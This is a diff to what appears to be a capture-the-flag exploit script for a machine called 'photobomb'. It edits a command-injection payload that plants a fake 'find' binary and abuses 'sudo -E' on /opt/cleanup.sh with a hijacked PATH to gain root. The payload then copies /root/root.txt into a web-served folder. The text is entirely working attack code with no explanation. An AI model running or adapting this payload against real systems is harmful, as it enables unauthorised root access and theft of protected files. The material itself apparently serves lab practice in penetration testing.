@@ -77,7 +77,7 @@ root_payload = (
     "'/usr/bin/id > /home/wizard/photobomb/public/ui_images/root-proof.txt' "
     "'/bin/cat /root/root.txt >> /home/wizard/photobomb/public/ui_images/root-proof.txt' "
     "> /home/wizard/photobomb/find; chmod 0755 /home/wizard/photobomb/find; "
-    "sudo -n PATH=/home/wizard/photobomb:/usr/bin:/bin /opt/cleanup.sh "
+    "PATH=/home/wizard/photobomb:/usr/bin:/bin sudo -n -E /opt/cleanup.sh "
     "> /home/wizard/photobomb/public/ui_images/sudo-output.txt 2>&1;#"
 )
 submit(root_payload)
